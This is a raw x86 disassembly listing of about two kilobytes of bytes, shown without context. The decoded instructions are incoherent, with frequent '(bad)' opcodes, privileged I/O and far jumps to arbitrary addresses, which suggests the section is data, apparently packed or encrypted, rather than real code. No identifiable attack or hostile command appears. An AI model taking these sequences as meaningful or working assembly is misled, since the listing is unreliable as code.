  41b452:	gs push esp
  41b454:	lods   al,BYTE PTR ds:[esi]
  41b455:	cmp    DWORD PTR [esi],edx
  41b457:	lods   al,BYTE PTR ds:[esi]
  41b458:	test   DWORD PTR ds:0xf6de3a8e,edi
  41b45e:	adc    eax,0x674bd7e7
  41b463:	test   eax,0xc9013405
  41b468:	cmp    BYTE PTR [esi],dh
  41b46a:	fild   QWORD PTR [edx]
  41b46c:	mov    edi,0xf60923e
  41b471:	mov    ch,0x81
  41b473:	adc    dh,BYTE PTR [ecx+0x4d883184]
  41b479:	fsub   DWORD PTR [esi+edi*2-0x18]
  41b47d:	xchg   edx,eax
  41b47e:	adc    DWORD PTR [ecx],0x10
  41b481:	xchg   edx,eax
  41b482:	imul   ecx,DWORD PTR [esi-0x7a6f062],0x57
  41b489:	cmp    al,0x1c
  41b48b:	xchg   edx,eax
  41b48c:	jle    0x41b4f1
  41b48e:	xor    esp,DWORD PTR [edx+0xccc9c1b]
  41b494:	out    dx,eax
  41b495:	pop    ecx
  41b496:	jmp    0x1bdab0e7
  41b49b:	inc    edi
  41b49c:	(bad)  
  41b49d:	mov    ebx,DWORD PTR [eax-0x7df7ec49]
  41b4a3:	fwait
  41b4a4:	mov    ebp,0xa43609a8
  41b4a9:	hlt    
  41b4aa:	xchg   BYTE PTR [ecx+0x42],al
  41b4ad:	stos   BYTE PTR es:[edi],al
  41b4ae:	es std 
  41b4b0:	dec    edx
  41b4b1:	xchg   DWORD PTR [ebp-0xddfccd4],eax
  41b4b7:	cmp    cl,BYTE PTR [ebp+0xe]
  41b4ba:	push   cs
  41b4bb:	xchg   ebp,esi
  41b4bd:	nop
  41b4be:	and    al,BYTE PTR [esi]
  41b4c0:	jno    0x41b4d8
  41b4c2:	loop   0x41b50e
  41b4c4:	aam    0x5d
  41b4c6:	inc    eax
  41b4c7:	push   ecx
  41b4c8:	fild   WORD PTR [eax-0x5ba70667]
  41b4ce:	dec    eax
  41b4cf:	mov    esi,0xb8fd285a
  41b4d4:	xchg   BYTE PTR [ecx+0x23dcdafb],dl
  41b4da:	jg     0x41b4db
  41b4dc:	mov    edx,0x9a3b7795
  41b4e1:	xor    al,BYTE PTR [ebx-0x5e]
  41b4e4:	(bad)  
  41b4e5:	ja     0x41b529
  41b4e7:	fsubr  DWORD PTR [ebp-0x538e8678]
  41b4ed:	popf   
  41b4ee:	dec    esp
  41b4ef:	(bad)  
  41b4f0:	jmp    0x41b53a
  41b4f2:	or     ebx,edi
  41b4f4:	fdivr  QWORD PTR [edi-0x6a]
  41b4f7:	adc    dh,BYTE PTR [esi+0x2f]
  41b4fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b4fb:	or     dh,BYTE PTR [edx+esi*2]
  41b4fe:	mov    bh,0xcf
  41b500:	test   al,0x41
  41b502:	add    dl,0x2d
  41b505:	mov    al,0xcc
  41b507:	sub    DWORD PTR [ecx+edi*4-0x3],esp
  41b50b:	sub    DWORD PTR [ebp-0x27],ebx
  41b50e:	imul   esp,ecx,0xffffff87
  41b511:	adc    cl,0x45
  41b514:	mov    esp,0x4b8e7ba4
  41b519:	mov    DWORD PTR [ebx],esp
  41b51b:	inc    ebp
  41b51c:	aaa    
  41b51d:	movups xmm7,XMMWORD PTR [esi-0x3a]
  41b521:	icebp  
  41b522:	stos   DWORD PTR es:[edi],eax
  41b523:	sbb    BYTE PTR [ecx-0x1b5bd910],0xd0
  41b52a:	mov    bh,0x3a
  41b52c:	dec    ebp
  41b52d:	xchg   esp,eax
  41b52e:	mov    ds:0xba05e584,al
  41b533:	xor    DWORD PTR [ecx],0x30498003
  41b539:	sti    
  41b53a:	pop    ax
  41b53c:	inc    ebx
  41b53d:	push   ebx
  41b53e:	pop    esi
  41b53f:	fdivr  QWORD PTR [ecx-0xe]
  41b542:	push   ebx
  41b543:	sub    eax,0x71a3b55c
  41b548:	imul   ecx,DWORD PTR [esi-0x36b755eb],0x3b
  41b54f:	fmul   QWORD PTR [esi]
  41b551:	into   
  41b552:	fs data16 aaa 
  41b555:	push   edx
  41b556:	inc    ebx
  41b557:	add    eax,0x880a7e
  41b55c:	adc    eax,0xb5c38c8d
  41b561:	imul   BYTE PTR [edx]
  41b563:	pop    ss
  41b564:	jl     0x41b4e9
  41b566:	jnp    0x41b5bf
  41b568:	and    esp,edi
  41b56a:	or     bl,ch
  41b56c:	cwde   
  41b56d:	fwait
  41b56e:	mul    DWORD PTR ds:0xa6a060e3
  41b574:	imul   esi,DWORD PTR ds:0xa2097f0c,0xffffffe7
  41b57b:	sbb    esi,DWORD PTR [ebx+0x3b]
  41b57e:	inc    esi
  41b57f:	dec    esp
  41b580:	into   
  41b581:	shr    BYTE PTR [esp+edi*1],0x6d
  41b585:	add    eax,0xf009f4f
  41b58a:	sbb    DWORD PTR [ebx],ecx
  41b58c:	xlat   BYTE PTR ds:[ebx]
  41b58d:	inc    ecx
  41b58e:	out    dx,eax
  41b58f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b590:	jo     0x41b53c
  41b592:	cdq    
  41b593:	xchg   ecx,eax
  41b594:	mov    dl,0x81
  41b596:	push   cs
  41b597:	stc    
  41b598:	jmp    0x41b5c4
  41b59a:	xlat   BYTE PTR ds:[ebx]
  41b59b:	adc    al,0x71
  41b59d:	fsubr  QWORD PTR [eax-0x197d7054]
  41b5a3:	xlat   BYTE PTR ds:[ebx]
  41b5a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b5a5:	cmp    eax,0x8abb0449
  41b5aa:	pop    ds
  41b5ab:	test   al,0xc2
  41b5ad:	jg     0x41b58b
  41b5af:	test   eax,0x58ae754
  41b5b4:	pop    ds
  41b5b5:	sub    al,0x3d
  41b5b8:	and    al,al
  41b5ba:	mov    al,ds:0x95a55213
  41b5bf:	adc    DWORD PTR [esi],ebp
  41b5c1:	and    cl,dl
  41b5c3:	add    ah,BYTE PTR [edi-0x61]
  41b5c6:	sub    eax,0x336e2856
  41b5cb:	fld    QWORD PTR [ebp+esi*2-0x3321b67b]
  41b5d2:	xchg   ebx,eax
  41b5d3:	jns    0x41b605
  41b5d5:	and    eax,0xb6f770e6
  41b5da:	nop    DWORD PTR [eax-0xa7bd19f]
  41b5e1:	mov    ah,0x12
  41b5e3:	xchg   edi,eax
  41b5e4:	mov    bl,0x15
  41b5e6:	je     0x41b65d
  41b5e8:	scas   al,BYTE PTR es:[edi]
  41b5e9:	xor    eax,0x2cd9ae74
  41b5ee:	dec    esi
  41b5ef:	jae    0x41b617
  41b5f1:	or     dl,BYTE PTR [ebp-0x12]
  41b5f4:	frstor [esi+0x19]
  41b5f7:	push   esp
  41b5f8:	mov    edi,0xcbd126bc
  41b5fd:	jecxz  0x41b622
  41b5ff:	jb     0x41b602
  41b601:	and    DWORD PTR [edx+0x70403a2c],ebx
  41b607:	inc    edx
  41b608:	scas   eax,DWORD PTR es:[edi]
  41b609:	mov    al,ds:0x45ea56a7
  41b60e:	mov    dl,0x23
  41b610:	sbb    DWORD PTR es:[ebx+0x20],ebp
  41b614:	inc    ebx
  41b615:	imul   ecx,DWORD PTR [ebp-0x48],0xa1648721
  41b61c:	ficomp DWORD PTR [edx]
  41b61e:	sbb    bl,BYTE PTR [esi+0x54676cc9]
  41b624:	shl    edx,0x7a
  41b627:	(bad)  
  41b628:	lods   eax,DWORD PTR ds:[esi]
  41b629:	fimul  WORD PTR [esi]
  41b62b:	dec    ebp
  41b62c:	and    eax,0x3f8e8753
  41b631:	lock adc ecx,esp
  41b634:	bndldx (bad),[edi+0x26]
  41b638:	popa   
  41b639:	das    
  41b63a:	mov    ecx,eax
  41b63c:	pop    ds
  41b63d:	mov    eax,ds:0xa2c25a02
  41b642:	add    al,0xd6
  41b644:	mov    ah,0x3
  41b646:	fsub   DWORD PTR [edx+edx*4]
  41b649:	cmp    eax,0xdf3021ab
  41b64e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b64f:	test   al,0xcb
  41b651:	daa    
  41b652:	jp     0x41b67b
  41b654:	lock mov eax,ds:0x3c53b7d6
  41b65a:	es in  eax,dx
  41b65c:	fbld   TBYTE PTR [esi]
  41b65e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b65f:	inc    esi
  41b660:	pop    esi
  41b661:	inc    esp
  41b662:	adc    al,0x41
  41b664:	dec    edx
  41b665:	imul   edi,DWORD PTR [esp+edi*8],0xfb3aa142
  41b66c:	inc    ecx
  41b66d:	pop    ebp
  41b66e:	adc    BYTE PTR [eax-0x20],ah
  41b671:	adc    DWORD PTR [esi-0x7df0f4c0],ecx
  41b677:	or     al,0xfd
  41b679:	outs   dx,DWORD PTR ds:[esi]
  41b67a:	mov    esp,0xb2757820
  41b67f:	nop
  41b680:	iret   
  41b681:	sub    eax,0xf91fe8b3
  41b686:	cmp    al,0x61
  41b688:	(bad)  
  41b689:	repz or BYTE PTR [ebp+0x56],cl
  41b68d:	mov    cl,0xe5
  41b68f:	or     BYTE PTR [edx],cl
  41b691:	fst    st(2)
  41b693:	sbb    DWORD PTR [edi],0xa14c8c8d
  41b699:	outs   dx,BYTE PTR ds:[esi]
  41b69a:	sbb    BYTE PTR [esi],al
  41b69c:	adc    eax,0x227dde00
  41b6a1:	fcomp  DWORD PTR [esi+0x47d24e5e]
  41b6a7:	jl     0x41b65b
  41b6a9:	call   0x2c58cd93
  41b6ae:	ret    0x7e4e
  41b6b1:	daa    
  41b6b2:	and    edi,edx
  41b6b4:	push   es
  41b6b5:	push   es
  41b6b6:	cmp    BYTE PTR [ecx+0x1c2d9388],cl
  41b6bc:	pushf  
  41b6bd:	int3   
  41b6be:	sub    cl,ch
  41b6c0:	jae    0x41b693
  41b6c2:	loop   0x41b6eb
  41b6c4:	adc    dl,cl
  41b6c6:	retf   0x8854
  41b6c9:	clc    
  41b6ca:	test   al,ah
  41b6cc:	(bad)
  41b6cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b6d0:	push   ebx
  41b6d1:	mov    ch,0x4a
  41b6d3:	jbe    0x41b6e5
  41b6d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b6d6:	out    dx,eax
  41b6d7:	sub    eax,0x8d756de4
  41b6dc:	jnp    0x41b71d
  41b6de:	icebp  
  41b6df:	push   ebp
  41b6e0:	mov    bh,0x81
  41b6e2:	popa   
  41b6e3:	aas    
  41b6e4:	and    edi,ebp
  41b6e6:	mov    ah,0x15
  41b6e8:	add    ax,0x6d7
  41b6ec:	cmp    BYTE PTR [ebx-0x5c1764e0],bl
  41b6f2:	mov    ebp,0x50b0feb4
  41b6f7:	enter  0xadf6,0xf0
  41b6fb:	outs   dx,DWORD PTR ds:[esi]
  41b6fc:	add    al,BYTE PTR [eax]
  41b6fe:	loope  0x41b6bb
  41b700:	push   eax
  41b701:	push   ss
  41b702:	fist   DWORD PTR [ecx+0x3b]
  41b705:	outs   dx,DWORD PTR ds:[esi]
  41b706:	push   cs
  41b707:	cmp    bh,BYTE PTR gs:[edx]
  41b70a:	push   ebp
  41b70b:	mov    dl,0xea
  41b70d:	loope  0x41b6b6
  41b70f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b710:	mov    ebx,0xb2d781ed
  41b715:	jecxz  0x41b6ab
  41b717:	fist   DWORD PTR [ecx+esi*8+0x4a]
  41b71b:	in     eax,dx
  41b71c:	sub    DWORD PTR [edi-0x4f7f8db5],esi
  41b722:	pop    fs
  41b724:	mov    ecx,0x1f20c804
  41b729:	pop    ecx
  41b72a:	sbb    eax,DWORD PTR [ebp+0x18]
  41b72d:	addr16 (bad) 
  41b72f:	enter  0xe207,0xd4
  41b733:	ret    
  41b734:	push   ebx
  41b735:	aaa    
  41b736:	pusha  
  41b737:	pop    ebx
  41b738:	add    cl,dl
  41b73a:	adc    eax,0xedcec1b2
  41b73f:	test   al,0x99
  41b741:	popa   
  41b742:	add    esp,DWORD PTR [ebx+0x33094cfb]
  41b748:	jp     0x41b6f9
  41b74a:	pusha  
  41b74b:	adc    eax,0xaf51203e
  41b750:	lahf   
  41b751:	mov    ecx,0x256bd2d2
  41b756:	popa   
  41b757:	mov    edx,0x32741b99
  41b75c:	cs pusha 
  41b75e:	or     BYTE PTR [edi+0x69],cl
  41b761:	enter  0x74dc,0x5a
  41b765:	fadd   st(7),st
  41b767:	add    al,0xe2
  41b769:	loop   0x41b7a1
  41b76b:	dec    ebp
  41b76c:	popf   
  41b76d:	int3   
  41b76e:	or     dh,BYTE PTR [ecx-0x4c519a26]
  41b774:	iret   
  41b775:	pop    eax
  41b776:	sti    
  41b777:	test   ah,0x6b
  41b77a:	and    eax,0x414f1a8a
  41b77f:	or     BYTE PTR [eax],ch
  41b781:	je     0x41b7b2
  41b783:	idiv   DWORD PTR [edi+0x4]
  41b786:	adc    al,0x2b
  41b788:	mov    dh,0x2a
  41b78a:	rcr    DWORD PTR [ecx+0x1607162c],cl
  41b790:	or     bh,BYTE PTR [eax+eax*8-0x39]
  41b794:	mov    WORD PTR [eax-0x78],ss
  41b797:	fcom   QWORD PTR [esi-0xe]
  41b79a:	scas   al,BYTE PTR es:[edi]
  41b79b:	popf   
  41b79c:	neg    DWORD PTR [eax]
  41b79e:	arpl   bx,bp
  41b7a0:	xor    cl,dl
  41b7a2:	jmp    0x6a36:0xbbb9256f
  41b7a9:	xchg   ebx,eax
  41b7aa:	pop    ecx
  41b7ab:	inc    eax
  41b7ac:	das    
  41b7ad:	dec    eax
  41b7ae:	fsub   QWORD PTR es:[edi-0x944060c]
  41b7b5:	imul   esp,DWORD PTR [esi],0x6bb06a61
  41b7bb:	addr16 cmp ax,0x4512
  41b7c0:	(bad)  
  41b7c1:	out    0xe7,eax
  41b7c3:	xor    DWORD PTR fs:[edx+0x62acdcfd],eax
  41b7ca:	jle    0x41b783
  41b7cc:	push   esp
  41b7cd:	cs pshufw mm1,mm6,0x43
  41b7d2:	jecxz  0x41b824
  41b7d4:	sub    al,0x9e
  41b7d6:	xor    ebx,ebx
  41b7d8:	repnz ss pop ds
  41b7db:	and    al,0x3e
  41b7dd:	in     eax,dx
  41b7de:	bts    DWORD PTR [esi+0x4c30bc32],ebx
  41b7e5:	sbb    bh,BYTE PTR [edi-0x4ef06cef]
  41b7eb:	test   BYTE PTR [edi-0x10],0xdd
  41b7ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b7f0:	adc    al,0x93
  41b7f2:	xchg   esi,eax
  41b7f3:	push   0x59
  41b7f5:	loop   0x41b842
  41b7f7:	pop    esp
  41b7f8:	mov    bh,0x4e
  41b7fa:	add    eax,0x84c9a700
  41b7ff:	repnz adc esp,esi
  41b802:	shl    BYTE PTR [ebp-0x60],1
  41b805:	and    dl,BYTE PTR [eax+esi*4]
  41b808:	(bad)  
  41b809:	pop    ebp
  41b80a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b80b:	test   BYTE PTR [eax-0x1d926fa7],al
  41b811:	jmp    0xf4c2:0xbb86ab84
  41b818:	sub    al,BYTE PTR [ebp-0x7b]
  41b81b:	pop    edi
  41b81c:	in     al,dx
  41b81d:	push   0xffffffa4
  41b81f:	repz sub DWORD PTR ds:0xd87da187,0x41d56f52
  41b82a:	push   esi
  41b82b:	ins    DWORD PTR es:[edi],dx
  41b82c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b82d:	dec    BYTE PTR ds:0x9eab0bd5
  41b833:	scas   eax,DWORD PTR es:[edi]
  41b834:	adc    al,0xdc
  41b836:	jb     0x41b899
  41b838:	mov    eax,0x60ed54be
  41b83d:	mov    al,0xd7
  41b83f:	cmp    DWORD PTR [edx-0x22],0xcd97cb86
  41b846:	push   esi
  41b847:	ins    DWORD PTR es:[edi],dx
  41b848:	adc    al,0x38
  41b84a:	jbe    0x41b879
  41b84c:	sar    BYTE PTR [eax+ebx*2+0x5],0xf5
  41b851:	addr16 fs pop ebx
  41b854:	add    eax,0xf0e886a5
  41b859:	sub    BYTE PTR [esp+eiz*2],0xdd
  41b85d:	int    0x69
  41b85f:	retf   
  41b860:	mov    dh,0x6e
  41b862:	out    0x65,eax
  41b864:	cmp    DWORD PTR [edx-0x9],edi
  41b867:	hlt    
  41b868:	fisub  DWORD PTR [ebx-0x34]
  41b86b:	call   0xd16f:0x2e11823b
  41b872:	int3   
  41b873:	outs   dx,DWORD PTR ds:[esi]
  41b874:	pop    ss
  41b875:	xchg   ebx,eax
  41b876:	pop    edx
  41b877:	dec    ebx
  41b878:	out    0x77,al
  41b87a:	fimul  WORD PTR [ebp-0x51e9d7f8]
  41b880:	hlt    
  41b881:	fistp  DWORD PTR [edi-0x8]
  41b884:	movsx  esp,BYTE PTR [eax]
  41b887:	xor    bl,ah
  41b889:	stos   BYTE PTR es:[edi],al
  41b88a:	xor    ecx,esi
  41b88c:	(bad)  
  41b88d:	mov    ebx,0x5ca82296
  41b892:	adc    DWORD PTR [edx],edi
  41b894:	push   es
  41b895:	fmul   st,st(7)
  41b897:	mov    esp,0x2e0ab362
  41b89c:	inc    ecx
  41b89d:	xor    al,0xdf
  41b89f:	jo     0x41b880
  41b8a1:	mov    ecx,0x29b7a63e
  41b8a6:	sbb    ebp,ecx
  41b8a8:	cwde   
  41b8a9:	jae    0x41b894
  41b8ab:	xor    al,0x5c
  41b8ad:	mov    ebp,0xfdbb9c5d
  41b8b2:	xor    ebx,DWORD PTR [eax-0x21]
  41b8b5:	mov    bl,BYTE PTR [edi-0x6fe64033]
  41b8bb:	mov    edi,DWORD PTR [edi-0x59db1d26]
  41b8c1:	mov    bh,0xdd
  41b8c3:	retf   
  41b8c4:	js     0x41b90d
  41b8c6:	mov    al,0x5d
  41b8c8:	xchg   ecx,eax
  41b8c9:	data16 (bad) 
  41b8cb:	call   0xf236356b
  41b8d0:	xor    BYTE PTR [edx+0x4d],cl
  41b8d3:	shr    BYTE PTR [esi-0x3a],1
  41b8d6:	stc    
  41b8d7:	ret    0x2d1a
  41b8da:	sbb    eax,DWORD PTR [ebx-0x18]
  41b8dd:	outs   dx,BYTE PTR ds:[esi]
  41b8de:	mov    eax,0xcbe71ffc
  41b8e3:	jle    0x41b8c7
  41b8e5:	mov    DWORD PTR [edx-0x3869d64f],esp
  41b8eb:	outs   dx,BYTE PTR ds:[esi]
  41b8ec:	sbb    ebx,DWORD PTR [edx]
  41b8ee:	mov    bh,0xfc
  41b8f0:	fist   DWORD PTR [ecx-0x7]
  41b8f3:	mov    edx,0xf98d0b36
  41b8f8:	push   ebx
  41b8f9:	push   ds
  41b8fa:	iret   
  41b8fb:	fisubr DWORD PTR [edx+0xf]
  41b8fe:	mov    DWORD PTR [ecx],edi
  41b900:	test   BYTE PTR [ecx],ah
  41b902:	clc    
  41b903:	jge    0x41b902
  41b905:	pop    ebp
  41b906:	add    DWORD PTR [edi-0x1e4467c1],edx
  41b90c:	ja     0x41b89c
  41b90e:	mov    ecx,esi
  41b910:	or     eax,0x64dace6
  41b915:	adc    esi,DWORD PTR [edx+0x4fdbf960]
  41b91b:	jl     0x41b8a9
  41b91d:	ins    BYTE PTR es:[edi],dx
  41b91e:	popa   
  41b91f:	inc    esp
  41b920:	js     0x41b96b
  41b922:	popf   
  41b923:	cmp    ah,bl
  41b925:	rcr    BYTE PTR [edx],1
  41b927:	fmul   DWORD PTR [ecx-0x59]
  41b92a:	push   ss
  41b92b:	rol    BYTE PTR ds:[esi+ebp*1-0x3c],1
  41b930:	mov    eax,0x34faee69
  41b935:	ins    BYTE PTR es:[edi],dx
  41b936:	dec    ebp
  41b937:	sahf   
  41b938:	shr    BYTE PTR [edi],1
  41b93a:	xor    bh,al
  41b93c:	mov    dl,0x16
  41b93e:	es and eax,0xc8b01230
  41b944:	out    0xec,al
  41b946:	mov    al,0xc6
  41b948:	je     0x41b9bc
  41b94a:	jp     0x41b996
  41b94c:	mov    ch,0x41
  41b94e:	sbb    bl,BYTE PTR [esi-0x31e7b3b5]
  41b954:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b955:	inc    eax
  41b956:	mov    al,0xb6
  41b958:	lods   al,BYTE PTR gs:[esi]
  41b95a:	loop   0x41b934
  41b95c:	(bad)  
  41b95d:	xchg   ecx,eax
  41b95e:	and    al,ch
  41b960:	xlat   BYTE PTR ds:[ebx]
  41b961:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b962:	jmp    0x41b97a
  41b964:	bound  eax,QWORD PTR [eax+0x4b]
  41b967:	imul   esi,DWORD PTR [ebx-0x65],0x7f
  41b96b:	fstp   TBYTE PTR ds:0xa99c7dbb
  41b971:	fcmovnbe st,st(3)
  41b973:	jmp    0x41b98b
  41b975:	mov    cs,WORD PTR ds:0xd37c34ea
  41b97b:	jmp    0xb58511b1
  41b980:	test   BYTE PTR [ebp+esi*1-0x1afca152],0xd0
  41b988:	(bad)  [ebx]
  41b98a:	scas   al,BYTE PTR es:[edi]
  41b98b:	mov    ebp,0xc0bdac4
  41b990:	or     al,0x49
  41b992:	aam    0x61
  41b994:	inc    eax
  41b995:	call   0x7323170c
  41b99a:	rcr    BYTE PTR [eax+0x62fb9e88],1
  41b9a0:	inc    eax
  41b9a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b9a2:	push   0x2
  41b9a4:	sbb    cl,BYTE PTR [esp+ebx*2]
  41b9a7:	inc    ebx
  41b9a8:	xchg   esp,eax
  41b9a9:	cld    
  41b9aa:	dec    eax
  41b9ab:	inc    ebp
  41b9ac:	and    al,0xa3
  41b9ae:	push   0x23
  41b9b0:	enter  0xbad2,0x61
  41b9b4:	inc    ebx
  41b9b5:	je     0x41b97c
  41b9b7:	xlat   BYTE PTR ds:[ebx]
  41b9b8:	lods   eax,DWORD PTR ds:[esi]
  41b9b9:	lea    esi,[eax]
  41b9bb:	fbld   TBYTE PTR [edx]
  41b9bd:	xor    al,0xf
  41b9bf:	sbb    DWORD PTR [ebx-0x6271608],0x59eccb9b
  41b9c9:	loopne 0x41b99b
  41b9cb:	mov    bh,0x4b
  41b9cd:	(bad)  
  41b9ce:	sbb    ebp,ecx
  41b9d0:	add    dl,BYTE PTR [ecx+ecx*4]
  41b9d3:	push   0x57
  41b9d5:	mov    al,ds:0xc59d5206
  41b9da:	ss add eax,0x83fe6f63
  41b9e0:	daa    
  41b9e1:	jnp    0x41b9aa
  41b9e3:	push   0x43384732
  41b9e8:	dec    edi
  41b9e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b9ea:	push   ecx
  41b9eb:	popf   
  41b9ec:	inc    ebp
  41b9ed:	adc    al,0x30
  41b9ef:	ss daa 
  41b9f1:	out    0x78,al
  41b9f3:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  41b9f5:	ss pushf 
  41b9f7:	cmp    al,BYTE PTR [ebx-0x6a94b8c2]
  41b9fd:	sub    al,BYTE PTR [ecx-0x71]
  41ba00:	fisubr DWORD PTR [ecx-0x3b]
  41ba03:	cld    
  41ba04:	mov    ebp,0xf5d64a4e
  41ba09:	ror    DWORD PTR [edx],0xcb
  41ba0c:	pop    es
  41ba0d:	lahf   
  41ba0e:	es xchg ecx,eax
  41ba10:	mov    edx,0x49b67f24
  41ba15:	sbb    al,0x46
  41ba17:	pop    esp
  41ba18:	loope  0x41ba4c
  41ba1a:	sbb    DWORD PTR [eax+0x13],0xffffff8b
  41ba1e:	jp     0x41b9a1
  41ba20:	outs   dx,BYTE PTR ds:[esi]
  41ba21:	shr    DWORD PTR [edx],1
  41ba23:	mov    DWORD PTR [ecx],edi
  41ba25:	retf   
  41ba26:	cmc    
  41ba27:	dec    ebp
  41ba28:	and    eax,0x792ed850
  41ba2d:	fs cli 
  41ba2f:	pop    ss
  41ba30:	loopne 0x41ba36
  41ba32:	popa   
  41ba33:	lock cmpxchg BYTE PTR [eax-0x5bce3651],bh
  41ba3b:	or     BYTE PTR [edi-0x13f1fa9d],0x53
  41ba42:	jmp    0xe840:0x22ccd9af
  41ba49:	cmp    dl,dl
  41ba4b:	enter  0x458c,0x68
  41ba4f:	sub    ecx,DWORD PTR [ecx-0x61]
  41ba52:	les    ecx,FWORD PTR [edx+0x7f3f2db1]
  41ba58:	(bad)  
  41ba59:	inc    BYTE PTR [edi]
  41ba5b:	push   ebx
  41ba5c:	daa    
  41ba5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ba5e:	and    BYTE PTR [ebx+0x14a985ca],bh
  41ba64:	mov    ebx,DWORD PTR [edi]
  41ba66:	sub    al,0xb7
  41ba68:	sti    
  41ba69:	fisttp DWORD PTR [esi]
  41ba6b:	outs   dx,BYTE PTR ds:[esi]
  41ba6c:	fdivr  st(4),st
  41ba6e:	inc    edi
  41ba6f:	mov    ds:0x1548750f,al
  41ba74:	fs inc ecx
  41ba76:	mov    ah,dh
  41ba78:	and    ah,BYTE PTR [edx-0x72eaf1e]
  41ba7e:	xor    eax,DWORD PTR [edi]
  41ba80:	dec    ebx
  41ba81:	mov    ebp,0xd5ac279d
  41ba86:	icebp  
  41ba87:	cmp    eax,DWORD PTR [esp+esi*2-0x4ee7298c]
  41ba8e:	call   0x596b:0xa74cabe6
  41ba95:	cmp    BYTE PTR ss:[ebp-0x2cf57365],dh
  41ba9c:	sbb    edx,DWORD PTR [ecx-0x67b072f2]
  41baa2:	and    edx,DWORD PTR [esi]
  41baa4:	xor    al,0x2d
  41baa6:	aaa    
  41baa7:	xor    ecx,ecx
  41baa9:	pushf  
  41baaa:	das    
  41baab:	xor    esp,ebp
  41baad:	xchg   esp,eax
  41baae:	mov    ch,0x9
  41bab0:	lock mov al,0xf4
  41bab3:	ret    0x84d4
  41bab6:	callw  0x7e2f
  41baba:	push   edx
  41babb:	mov    ds:0xd0d9d94b,al
  41bac0:	cmp    al,0x5b
  41bac2:	pop    ecx
  41bac3:	and    dl,BYTE PTR [ebx-0x24ca4838]
  41bac9:	rcl    BYTE PTR [eax+0x8fd3d09],0x26
  41bad0:	in     eax,dx
  41bad1:	cmc    
  41bad2:	cmp    eax,ecx
  41bad4:	test   eax,0x6cd28d68
  41bad9:	dec    ebp
  41bada:	xor    ebx,esi
  41badc:	cmovno edx,DWORD PTR [ebp+0x5a]
  41bae0:	daa    
  41bae1:	fcmovne st,st(5)
  41bae3:	(bad)  
  41bae4:	fidivr DWORD PTR [edx-0x3cb37df1]
  41baea:	dec    eax
  41baeb:	mov    cl,0xb4
  41baee:	outs   dx,DWORD PTR ds:[esi]
  41baef:	push   ds
  41baf0:	push   es
  41baf1:	dec    ebx
  41baf2:	int    0xe9
  41baf4:	push   esp
  41baf5:	jecxz  0x41bb43
  41baf7:	data16 sub bl,ah
  41bafa:	out    0x48,al
  41bafc:	loopne 0x41ba84
  41bafe:	add    al,0x50
  41bb00:	xor    DWORD PTR [edi],0xffffffb9
  41bb03:	repz inc eax
  41bb05:	nop
  41bb06:	loop   0x41bb1f
  41bb08:	stos   BYTE PTR es:[edi],al
  41bb09:	imul   edx,DWORD PTR [ebx],0xf506f34
  41bb0f:	dec    esi
  41bb10:	add    BYTE PTR [ebx+eax*2-0x27065591],ah
  41bb17:	cmc    
  41bb18:	fisub  DWORD PTR [eax]
  41bb1a:	push   esp
  41bb1b:	dec    esi
  41bb1c:	xchg   ebp,eax
  41bb1d:	icebp  
  41bb1e:	mov    edx,0xc7701147
  41bb23:	or     al,0xb5
  41bb25:	pop    esi
  41bb26:	xchg   DWORD PTR [esi],edi
  41bb28:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  41bb2a:	and    ebx,esi
  41bb2c:	mov    dl,0xa6
  41bb2e:	sub    ecx,ebp
  41bb30:	fisub  WORD PTR [ebx+edi*4]
  41bb33:	dec    ecx
  41bb34:	pushf  
  41bb35:	mov    dl,0x7d
  41bb37:	cld    
  41bb38:	jne    0x41bb63
  41bb3a:	fisubr DWORD PTR [ebx-0x6a]
  41bb3d:	mov    ch,0x5f
  41bb3f:	xlat   BYTE PTR ds:[ebx]
  41bb40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bb41:	jb     0x41bae1
  41bb43:	in     eax,dx
  41bb44:	or     al,0xc
  41bb46:	test   BYTE PTR [ebp-0x23f3b469],dh
  41bb4c:	add    DWORD PTR [edi-0x13],esp
  41bb4f:	stos   DWORD PTR es:[edi],eax
  41bb50:	inc    ebx
  41bb51:	mov    al,0x27
  41bb53:	cmp    BYTE PTR [ebx+0x68fa207e],cl
  41bb59:	inc    eax
  41bb5a:	jle    0x41bb58
  41bb5c:	fsubr  st(4),st
  41bb5e:	call   0x4169:0x5586b206
  41bb65:	test   eax,0x8e66c146
  41bb6a:	mov    al,ds:0x636bb257
  41bb6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bb71:	mov    eax,ds:0xeae8c2b0
  41bb76:	cwde   
  41bb77:	xchg   ebp,eax
  41bb78:	arpl   cx,cx
  41bb7a:	pop    esp
  41bb7b:	shl    DWORD PTR [ebx],1
  41bb7d:	fiadd  WORD PTR [ecx]
  41bb7f:	repz leave 
  41bb81:	mov    dl,0x6d
  41bb83:	xchg   edx,eax
  41bb84:	adc    eax,0x12fd9739
  41bb89:	push   0xfffffff7
  41bb8b:	imul   esp,DWORD PTR [edx-0xee162cd],0x69
  41bb92:	aam    0xbe
  41bb94:	mov    al,ds:0x8c4879f2
  41bb99:	xor    BYTE PTR [eax-0x58db6141],bh
  41bb9f:	push   cs
  41bba0:	jmp    0x41bb56
  41bba2:	mov    bl,0xc7
  41bba4:	inc    edi
  41bba5:	jecxz  0x41bb9f
  41bba7:	dec    ebx
  41bba8:	adc    eax,ebp
  41bbaa:	mov    cl,0x9d
